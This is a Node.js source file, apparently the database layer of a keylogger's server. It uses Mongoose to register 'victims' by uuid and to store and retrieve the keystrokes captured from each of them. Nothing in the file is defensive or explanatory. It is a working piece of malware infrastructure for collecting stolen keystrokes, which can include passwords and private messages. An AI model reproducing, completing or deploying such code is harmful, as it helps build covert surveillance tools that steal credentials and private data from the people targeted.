const mongoose = require("mongoose");
const { Victim, Keystroke } = require("../models");

//  Set mongoose options
mongoose.set("useNewUrlParser", true);
mongoose.set("useUnifiedTopology", true);
mongoose.connection.on("open", () => {
    console.log("MongoDB database connection established successfully");
})

//  Connect to DB
function connect() {
    mongoose.connect(process.env.DB_CONNECTION, (error) => {
        if (error)
            console.error("Unable to connect to MongoDB: ", error.message);
    });
}

//  Add new victim to database
function addVictim(obj) {
    // Check if victim already exists in database
    Victim.exists({ uuid: obj.uuid })
        .then(exists => {
            // Add victim if its not in the database
            if (!exists) {
                const victim = new Victim(obj);

                // Save victim
                victim.save()
                    .then(data => console.log("New victim added: ", data))
                    .catch(error => console.error("Unable to add victim: ", error));
            }
        })
        .catch(error => console.error("unable to check if victim exits in database, Unable to add victim: ", error));
}

//  Get all victims from database
async function getAllVictims() {
    const victims = await Victim.find({}, "-_id -__v -keystrokes");
    return victims;
}

//  Add keystroke to database
async function addKeystroke(uuid, obj) {
    console.log(`Adding keystroke(s) for victim: ${uuid}, ${obj}`);
    
    Victim.findOne({ uuid: uuid })
        .then(document => {
            document.keystrokes.push(new Keystroke(obj));

            document.save()
                .then(() => { console.log("Keystrokes saved") })
                .catch(error => { console.error("Unable to add keystrokes: ", error)});
        })
        .catch(error => console.error("Unable to check if victim exits in database, unable to add keystroke: ", error));
}

//  Get keysrokes for specific victim
async function getKeystrokes(uuid) {
    console.log(`Getting keystroke(s) for victim: ${uuid}`);
    
    let victimKeystrokes = [];

    await Victim.findOne({ uuid: uuid }, "-_id")
    .then(document => {
        console.log(`Retrieved keystrokes for victim: ${uuid}`);
        victimKeystrokes = document.keystrokes;
    })
    .catch(error => { console.log("Unable to get keystrokes, unable to find victim: ", error) });

    return victimKeystrokes;
}


module.exports = {
    connect,
    addVictim,
    getAllVictims,
    addKeystroke,
    getKeystrokes
}